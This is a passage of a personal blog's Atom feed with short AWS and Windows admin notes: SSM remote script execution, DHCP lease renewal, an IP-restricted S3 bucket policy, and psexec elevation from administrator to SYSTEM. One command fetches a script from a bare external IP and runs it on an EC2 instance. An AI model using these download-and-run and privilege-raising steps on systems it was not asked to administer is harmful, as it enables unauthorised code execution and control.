    <link href="https://tonghuaroot.com/2019/05/28/Use-AWS-SSM-Systems-Manager-execute-remote-script-file-at-EC2-instance/"/>
    <id>https://tonghuaroot.com/2019/05/28/Use-AWS-SSM-Systems-Manager-execute-remote-script-file-at-EC2-instance/</id>
    <published>2019-05-28T02:45:16.000Z</published>
    <updated>2019-05-29T08:43:03.796Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-TL-DR"><a href="#0x00-TL-DR" class="headerlink" title="0x00 TL;DR"></a>0x00 TL;DR</h2><p>This article documents how to use AWS SSM to execute remote script files at EC2 instances.<br>There are two general methods:<br>1.Running Scripts from GitHub and Amazon S3<br>2.First upload the file to EC2 through SSM, and then use SSM to execute the command to run the uploaded script.</p><h2 id="0x01-Running-Scripts-from-GitHub"><a href="#0x01-Running-Scripts-from-GitHub" class="headerlink" title="0x01 Running Scripts from GitHub"></a>0x01 Running Scripts from GitHub</h2><p>Use the following AWS Cli command<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ssm send-command --document-name &quot;AWS-RunRemoteScript&quot; --instance-ids &quot;i-0d781805630c8edc0&quot; --parameters &apos;&#123;&quot;sourceType&quot;:[&quot;GitHub&quot;],&quot;sourceInfo&quot;:[&quot;&#123;\&quot;owner\&quot;:\&quot;omg2hei\&quot;, \&quot;repository\&quot;:\&quot;PowerShellDemo\&quot;, \&quot;path\&quot;: \&quot;/\&quot;&#125;&quot;],&quot;commandLine&quot;:[&quot;get-process.ps1&quot;]&#125;&apos;</span><br></pre></td></tr></table></figure></p><p>Then EC2 instance(Windows Server 2016) will be execute get-process.ps1.</p><h2 id="0x02-First-upload-the-file-to-EC2-through-SSM-and-then-use-SSM-to-execute-the-command-to-run-the-uploaded-script"><a href="#0x02-First-upload-the-file-to-EC2-through-SSM-and-then-use-SSM-to-execute-the-command-to-run-the-uploaded-script" class="headerlink" title="0x02 First upload the file to EC2 through SSM, and then use SSM to execute the command to run the uploaded script"></a>0x02 First upload the file to EC2 through SSM, and then use SSM to execute the command to run the uploaded script</h2><p>Step 1.Upload file to EC2 use SSM<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ssm send-command --document-name &quot;AWS-RunPowerShellScript&quot; --parameters commands=&quot;Invoke-WebRequest http://52.80.67.123:8000/get-process.ps1 -OutFile c:\get-process.ps1&quot; --instance-ids i-0d781805630c8edc0 --document-version &quot;\$DEFAULT&quot;</span><br></pre></td></tr></table></figure></p><p>Step 2.use SSM to execute the command to run the uploaded script<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ssm send-command --document-name &quot;AWS-RunPowerShellScript&quot; --parameters commands=&quot;c:\get-process.ps1&quot; --instance-ids i-0d781805630c8edc0 --document-version &quot;\$DEFAULT&quot;</span><br></pre></td></tr></table></figure></p><h2 id="0x03-Reference"><a href="#0x03-Reference" class="headerlink" title="0x03 Reference"></a>0x03 Reference</h2><p>[1] Running Scripts from GitHub and Amazon S3  - <a href="https://docs.aws.amazon.com/systems-manager/latest/userguide/integration-remote-scripts.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/systems-manager/latest/userguide/integration-remote-scripts.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-TL-DR&quot;&gt;&lt;a href=&quot;#0x00-TL-DR&quot; class=&quot;headerlink&quot; title=&quot;0x00 TL;DR&quot;&gt;&lt;/a&gt;0x00 TL;DR&lt;/h2&gt;&lt;p&gt;This article documents how to use AWS 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>AWS VPC DHCP Options Set change Effective immediately</title>
    <link href="https://tonghuaroot.com/2019/05/23/AWS-VPC-DHCP-Options-Set-change-Effective-immediately/"/>
    <id>https://tonghuaroot.com/2019/05/23/AWS-VPC-DHCP-Options-Set-change-Effective-immediately/</id>
    <published>2019-05-23T06:55:06.000Z</published>
    <updated>2019-05-29T02:20:11.890Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-TL-DR"><a href="#0x00-TL-DR" class="headerlink" title="0x00 TL;DR"></a>0x00 TL;DR</h2><p>Usually, after the DHCP Options Set changes, it takes several hours for the EC2 instance inside the VPC to use the new DHCP Options Set.<br>This article describes how to make the configuration of the DHCP Options Set take effect immediately in the specified EC2 instance.<br>The overall idea is to restart the EC2 instance network and let the DHCP service reassign network information.</p><h2 id="0x01-VPC-change-DHCP-Options-Set"><a href="#0x01-VPC-change-DHCP-Options-Set" class="headerlink" title="0x01 VPC change DHCP Options Set"></a>0x01 VPC change DHCP Options Set</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 associate-dhcp-options --dhcp-options-id dopt-06d6a444d7a288888 --vpc-id vpc-0614eddfdb8988888</span><br></pre></td></tr></table></figure><blockquote><p>Note:After you associate a new set of DHCP options with a VPC, any existing instances and all new instances that you launch in the VPC use these options. You don’t need to restart or relaunch the instances. They automatically pick up the changes within a few hours, depending on how frequently the instance renews its DHCP lease. If you want, you can explicitly renew the lease using the operating system on the instance.</p></blockquote><h2 id="0x02-Set-DHCP-Options-Set-effect-immediately-in-specified-EC2-instance"><a href="#0x02-Set-DHCP-Options-Set-effect-immediately-in-specified-EC2-instance" class="headerlink" title="0x02 Set DHCP Options Set effect immediately in specified EC2 instance"></a>0x02 Set DHCP Options Set effect immediately in specified EC2 instance</h2><ul><li>Windows Server 2016 Renew DHCP Lease(ipconfig /renew):</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以太网适配器 以太网:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : cn-north-1.compute.internal</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::dd5d:2739:e78f:5566%14</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 10.0.0.39</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : 10.0.0.1</span><br><span class="line"></span><br><span class="line">隧道适配器 isatap.cn-north-1.compute.internal:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line"></span><br><span class="line">隧道适配器 本地连接* 3:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   IPv6 地址 . . . . . . . . . . . . : 2001:0:348b:fb58:4f6:3e50:f5ff:ffd8</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::4f6:3e50:f5ff:ffd8%12</span><br><span class="line">   默认网关. . . . . . . . . . . . . : ::</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;ipconfig /renew</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以太网适配器 以太网:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : corp.tonghua.com</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::dd5d:2739:e78f:5566%14</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 10.0.0.39</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : 10.0.0.1</span><br><span class="line"></span><br><span class="line">隧道适配器 本地连接* 3:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line"></span><br><span class="line">隧道适配器 isatap.corp.tonghua.com:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;</span><br></pre></td></tr></table></figure><ul><li>Amazon Linux 2 Renew DHCP Lease(sudo service network restart):</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 ~]$ cat /var/lib/dhclient/dhclient--eth0.lease</span><br><span class="line">lease &#123;</span><br><span class="line">  interface &quot;eth0&quot;;</span><br><span class="line">  fixed-address 10.0.0.64;</span><br><span class="line">  option subnet-mask 255.255.255.0;</span><br><span class="line">  option dhcp-lease-time 3600;</span><br><span class="line">  option routers 10.0.0.1;</span><br><span class="line">  option dhcp-message-type 5;</span><br><span class="line">  option dhcp-server-identifier 10.0.0.1;</span><br><span class="line">  option domain-name-servers 10.0.0.2;</span><br><span class="line">  option interface-mtu 9001;</span><br><span class="line">  option broadcast-address 10.0.0.255;</span><br><span class="line">  option host-name &quot;ip-10-0-0-64&quot;;</span><br><span class="line">  option domain-name &quot;cn-north-1.compute.internal&quot;;</span><br><span class="line">  renew 4 2019/05/23 13:35:11;</span><br><span class="line">  rebind 4 2019/05/23 14:02:11;</span><br><span class="line">  expire 4 2019/05/23 14:09:41;</span><br><span class="line">&#125;</span><br><span class="line">lease &#123;</span><br><span class="line">  interface &quot;eth0&quot;;</span><br><span class="line">  fixed-address 10.0.0.64;</span><br><span class="line">  option subnet-mask 255.255.255.0;</span><br><span class="line">  option routers 10.0.0.1;</span><br><span class="line">  option dhcp-lease-time 3600;</span><br><span class="line">  option dhcp-message-type 5;</span><br><span class="line">  option domain-name-servers 10.0.0.2;</span><br><span class="line">  option dhcp-server-identifier 10.0.0.1;</span><br><span class="line">  option interface-mtu 9001;</span><br><span class="line">  option broadcast-address 10.0.0.255;</span><br><span class="line">  option host-name &quot;ip-10-0-0-64&quot;;</span><br><span class="line">  option domain-name &quot;cn-north-1.compute.internal&quot;;</span><br><span class="line">  renew 4 2019/05/23 13:36:56;</span><br><span class="line">  rebind 4 2019/05/23 14:02:23;</span><br><span class="line">  expire 4 2019/05/23 14:09:53;</span><br><span class="line">&#125;</span><br><span class="line">lease &#123;</span><br><span class="line">  interface &quot;eth0&quot;;</span><br><span class="line">  fixed-address 10.0.0.64;</span><br><span class="line">  option subnet-mask 255.255.255.0;</span><br><span class="line">  option routers 10.0.0.1;</span><br><span class="line">  option dhcp-lease-time 3600;</span><br><span class="line">  option dhcp-message-type 5;</span><br><span class="line">  option domain-name-servers 10.0.0.2;</span><br><span class="line">  option dhcp-server-identifier 10.0.0.1;</span><br><span class="line">  option interface-mtu 9001;</span><br><span class="line">  option broadcast-address 10.0.0.255;</span><br><span class="line">  option host-name &quot;ip-10-0-0-64&quot;;</span><br><span class="line">  option domain-name &quot;cn-north-1.compute.internal&quot;;</span><br><span class="line">  renew 4 2019/05/23 14:00:23;</span><br><span class="line">  rebind 4 2019/05/23 14:29:26;</span><br><span class="line">  expire 4 2019/05/23 14:36:56;</span><br><span class="line">&#125;</span><br><span class="line">lease &#123;</span><br><span class="line">  interface &quot;eth0&quot;;</span><br><span class="line">  fixed-address 10.0.0.64;</span><br><span class="line">  option subnet-mask 255.255.255.0;</span><br><span class="line">  option routers 10.0.0.1;</span><br><span class="line">  option dhcp-lease-time 3600;</span><br><span class="line">  option dhcp-message-type 5;</span><br><span class="line">  option domain-name-servers 10.0.0.2;</span><br><span class="line">  option dhcp-server-identifier 10.0.0.1;</span><br><span class="line">  option interface-mtu 9001;</span><br><span class="line">  option broadcast-address 10.0.0.255;</span><br><span class="line">  option host-name &quot;ip-10-0-0-64&quot;;</span><br><span class="line">  option domain-name &quot;cn-north-1.compute.internal&quot;;</span><br><span class="line">  renew 4 2019/05/23 14:29:09;</span><br><span class="line">  rebind 4 2019/05/23 14:52:53;</span><br><span class="line">  expire 4 2019/05/23 15:00:23;</span><br><span class="line">&#125;</span><br><span class="line">lease &#123;</span><br><span class="line">  interface &quot;eth0&quot;;</span><br><span class="line">  fixed-address 10.0.0.64;</span><br><span class="line">  option subnet-mask 255.255.255.0;</span><br><span class="line">  option routers 10.0.0.1;</span><br><span class="line">  option dhcp-lease-time 3600;</span><br><span class="line">  option dhcp-message-type 5;</span><br><span class="line">  option domain-name-servers 10.0.0.2;</span><br><span class="line">  option dhcp-server-identifier 10.0.0.1;</span><br><span class="line">  option interface-mtu 9001;</span><br><span class="line">  option broadcast-address 10.0.0.255;</span><br><span class="line">  option host-name &quot;ip-10-0-0-64&quot;;</span><br><span class="line">  option domain-name &quot;cn-north-1.compute.internal&quot;;</span><br><span class="line">  renew 4 2019/05/23 14:56:39;</span><br><span class="line">  rebind 4 2019/05/23 15:21:39;</span><br><span class="line">  expire 4 2019/05/23 15:29:09;</span><br><span class="line">&#125;</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$ sudo service network restart</span><br><span class="line">Restarting network (via systemctl):                        [  OK  ]</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$ cat /var/lib/dhclient/dhclient--eth0.lease</span><br><span class="line">lease &#123;</span><br><span class="line">  interface &quot;eth0&quot;;</span><br><span class="line">  fixed-address 10.0.0.64;</span><br><span class="line">  option subnet-mask 255.255.255.0;</span><br><span class="line">  option dhcp-lease-time 3600;</span><br><span class="line">  option routers 10.0.0.1;</span><br><span class="line">  option dhcp-message-type 5;</span><br><span class="line">  option dhcp-server-identifier 10.0.0.1;</span><br><span class="line">  option domain-name-servers 10.0.0.2;</span><br><span class="line">  option interface-mtu 9001;</span><br><span class="line">  option broadcast-address 10.0.0.255;</span><br><span class="line">  option host-name &quot;ip-10-0-0-64&quot;;</span><br><span class="line">  option domain-name &quot;cn-north-1.compute.internal&quot;;</span><br><span class="line">  renew 4 2019/05/23 14:56:39;</span><br><span class="line">  rebind 4 2019/05/23 15:21:39;</span><br><span class="line">  expire 4 2019/05/23 15:29:09;</span><br><span class="line">&#125;</span><br><span class="line">lease &#123;</span><br><span class="line">  interface &quot;eth0&quot;;</span><br><span class="line">  fixed-address 10.0.0.64;</span><br><span class="line">  option subnet-mask 255.255.255.0;</span><br><span class="line">  option routers 10.0.0.1;</span><br><span class="line">  option dhcp-lease-time 3600;</span><br><span class="line">  option dhcp-message-type 5;</span><br><span class="line">  option domain-name-servers 10.0.1.101,10.0.3.86;</span><br><span class="line">  option dhcp-server-identifier 10.0.0.1;</span><br><span class="line">  option interface-mtu 9001;</span><br><span class="line">  option broadcast-address 10.0.0.255;</span><br><span class="line">  option host-name &quot;ip-10-0-0-64&quot;;</span><br><span class="line">  option domain-name &quot;corp.tonghua.com&quot;;</span><br><span class="line">  renew 4 2019/05/23 15:14:34;</span><br><span class="line">  rebind 4 2019/05/23 15:39:02;</span><br><span class="line">  expire 4 2019/05/23 15:46:32;</span><br><span class="line">&#125;</span><br><span class="line">[ec2-user@ip-10-0-0-64 ~]$</span><br></pre></td></tr></table></figure><h2 id="0x03-Reference"><a href="#0x03-Reference" class="headerlink" title="0x03 Reference"></a>0x03 Reference</h2><ul><li><a href="https://docs.aws.amazon.com/zh_cn/vpc/latest/userguide/VPC_DHCP_Options.html" target="_blank" rel="noopener">DHCP Options Sets</a></li><li><a href="https://docs.aws.amazon.com/cli/latest/reference/ec2/associate-dhcp-options.html#examples" target="_blank" rel="noopener">associate-dhcp-options</a></li><li><a href="https://kb.wisc.edu/page.php?id=562" target="_blank" rel="noopener">WINDOWS - DISPLAYING, RELEASING AND RENEWING A DHCP LEASE</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-TL-DR&quot;&gt;&lt;a href=&quot;#0x00-TL-DR&quot; class=&quot;headerlink&quot; title=&quot;0x00 TL;DR&quot;&gt;&lt;/a&gt;0x00 TL;DR&lt;/h2&gt;&lt;p&gt;Usually, after the DHCP Options Set ch
      
    
    </summary>
    
    
      <category term="AWS" scheme="https://tonghuaroot.com/tags/AWS/"/>
    
  </entry>
  
  <entry>
    <title>How do I set the S3 bucket policy so that it can only be accessed by the specified IP</title>
    <link href="https://tonghuaroot.com/2019/05/23/How-do-I-set-the-S3-bucket-policy-so-that-it-can-only-be-accessed-by-the-specified-IP/"/>
    <id>https://tonghuaroot.com/2019/05/23/How-do-I-set-the-S3-bucket-policy-so-that-it-can-only-be-accessed-by-the-specified-IP/</id>
    <published>2019-05-23T02:28:58.000Z</published>
    <updated>2019-05-23T10:35:02.389Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-TL-DR"><a href="#0x00-TL-DR" class="headerlink" title="0x00 TL;DR"></a>0x00 TL;DR</h2><p>This document records how to set up the S3 bucket policy so that it can only be accessed by the specified IP.<br>Set the bucket policy to deny the operation except for the specified IP.</p><h2 id="0x01-Policy"><a href="#0x01-Policy" class="headerlink" title="0x01 Policy"></a>0x01 Policy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">  &quot;Id&quot;: &quot;S3PolicyId1&quot;,</span><br><span class="line">  &quot;Statement&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Sid&quot;: &quot;IPAllow&quot;,</span><br><span class="line">      &quot;Effect&quot;: &quot;Deny&quot;,</span><br><span class="line">      &quot;Principal&quot;: &quot;*&quot;,</span><br><span class="line">      &quot;Action&quot;: &quot;s3:*&quot;,</span><br><span class="line">      &quot;Resource&quot;: [</span><br><span class="line">        &quot;arn:aws-cn:s3:::testtonghua/*&quot;,</span><br><span class="line">        &quot;arn:aws-cn:s3:::testtonghua&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;Condition&quot;: &#123;</span><br><span class="line">        &quot;NotIpAddress&quot;: &#123;</span><br><span class="line">          &quot;aws:SourceIp&quot;: &quot;54.222.177.177/32&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>If you use this policy, you can access the S3 bucket only if the IP is 54.222.177.177.</p><blockquote><p>Note: Please confirm that the specified IP is a static IP,If you use dynamic IP, there is a risk that the S3 bucket will not be accessible when the IP is changed.if unfortunately, you need to contact the AWS Support revocation policy.</p></blockquote><h2 id="0x02-Reference"><a href="#0x02-Reference" class="headerlink" title="0x02 Reference"></a>0x02 Reference</h2><ul><li><a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/example-bucket-policies.html" target="_blank" rel="noopener">Bucket Policy Examples</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-TL-DR&quot;&gt;&lt;a href=&quot;#0x00-TL-DR&quot; class=&quot;headerlink&quot; title=&quot;0x00 TL;DR&quot;&gt;&lt;/a&gt;0x00 TL;DR&lt;/h2&gt;&lt;p&gt;This document records how to set up th
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>How Winodws Escalation Privilege from administrator privilege to system privilege</title>
    <link href="https://tonghuaroot.com/2019/05/22/How-Winodws-Escalation-Privilege-from-administrator-privilege-to-system-privilege/"/>
    <id>https://tonghuaroot.com/2019/05/22/How-Winodws-Escalation-Privilege-from-administrator-privilege-to-system-privilege/</id>
    <published>2019-05-22T07:45:32.000Z</published>
    <updated>2019-05-29T08:43:44.831Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-TL-DR"><a href="#0x00-TL-DR" class="headerlink" title="0x00 TL;DR"></a>0x00 TL;DR</h2><p>Record how Winodws Escalation Privilege from administrator privilege to system privilege.<br>Use psexec can do it.</p><h2 id="0x01-Steps"><a href="#0x01-Steps" class="headerlink" title="0x01 Steps"></a>0x01 Steps</h2><p>download:<a href="https://download.sysinternals.com/files/PSTools.zip" target="_blank" rel="noopener">https://download.sysinternals.com/files/PSTools.zip</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Downloads\PSTools&gt;whoami</span><br><span class="line">ec2amaz-okarxxx\administrator</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Downloads\PSTools&gt; .\psexec -i -s -d cmd</span><br><span class="line"></span><br><span class="line">PsExec v2.2 - Execute processes remotely</span><br><span class="line">Copyright (C) 2001-2016 Mark Russinovich</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd started on EC2AMAZ-OKARXXX with process ID 7848.</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Downloads\PSTools&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure><h2 id="0x02-Reference"><a href="#0x02-Reference" class="headerlink" title="0x02 Reference"></a>0x02 Reference</h2><ul><li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pstools" target="_blank" rel="noopener">PsTools</a></li><li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=255037" target="_blank" rel="noopener">AWS-ApplyPatchBaseline run command fails when running behind a proxy server</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-TL-DR&quot;&gt;&lt;a href=&quot;#0x00-TL-DR&quot; class=&quot;headerlink&quot; title=&quot;0x00 TL;DR&quot;&gt;&lt;/a&gt;0x00 TL;DR&lt;/h2&gt;&lt;p&gt;Record how Winodws Escalation Privileg
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Gogs RCE Vulnerability Analysis</title>
    <link href="https://tonghuaroot.com/2018/11/06/Gogs-RCE-Vulnerability-Analysis/"/>
    <id>https://tonghuaroot.com/2018/11/06/Gogs-RCE-Vulnerability-Analysis/</id>
    <published>2018-11-06T02:05:10.000Z</published>
    <updated>2019-05-21T17:24:57.352Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p>The article was first published in:<a href="https://www.anquanke.com/post/id/163575" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163575</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Others&quot;&gt;&lt;a href=&quot;#Others&quot; class=&quot;headerlink&quot; title=&quot;Others&quot;&gt;&lt;/a&gt;Others&lt;/h2&gt;&lt;p&gt;The article was first published in:&lt;a href=&quot;https://ww
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Enterprise Cyber security build of Windows lateral movement attacks detection</title>
    <link href="https://tonghuaroot.com/2018/03/02/Enterprise-Cyber-security-build-of-Windows-lateral-movement-attacks-detection/"/>
    <id>https://tonghuaroot.com/2018/03/02/Enterprise-Cyber-security-build-of-Windows-lateral-movement-attacks-detection/</id>
    <published>2018-03-02T03:01:18.000Z</published>
    <updated>2019-05-28T11:02:03.230Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p>The article was first published in:<a href="https://www.4hou.com/technology/10430.html" target="_blank" rel="noopener">https://www.4hou.com/technology/10430.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Others&quot;&gt;&lt;a href=&quot;#Others&quot; class=&quot;headerlink&quot; title=&quot;Others&quot;&gt;&lt;/a&gt;Others&lt;/h2&gt;&lt;p&gt;The article was first published in:&lt;a href=&quot;https://ww
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Flask debug mode PIN code generation mechanism security research notes</title>
    <link href="https://tonghuaroot.com/2017/12/25/Flask-debug-mode-PIN-code-generation-mechanism-security-research-notes/"/>
    <id>https://tonghuaroot.com/2017/12/25/Flask-debug-mode-PIN-code-generation-mechanism-security-research-notes/</id>
    <published>2017-12-25T00:46:17.000Z</published>
    <updated>2019-05-29T09:09:55.676Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p>The article was first published in:<a href="https://zhuanlan.zhihu.com/p/32336971" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/32336971</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Others&quot;&gt;&lt;a href=&quot;#Others&quot; class=&quot;headerlink&quot; title=&quot;Others&quot;&gt;&lt;/a&gt;Others&lt;/h2&gt;&lt;p&gt;The article was first published in:&lt;a href=&quot;https://zh
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>An example of network security problems in the IoT era</title>
    <link href="https://tonghuaroot.com/2016/10/22/An-example-of-network-security-problems-in-the-IoT-era/"/>
    <id>https://tonghuaroot.com/2016/10/22/An-example-of-network-security-problems-in-the-IoT-era/</id>
    <published>2016-10-22T11:12:16.000Z</published>
    <updated>2019-05-21T17:36:02.417Z</updated>
    
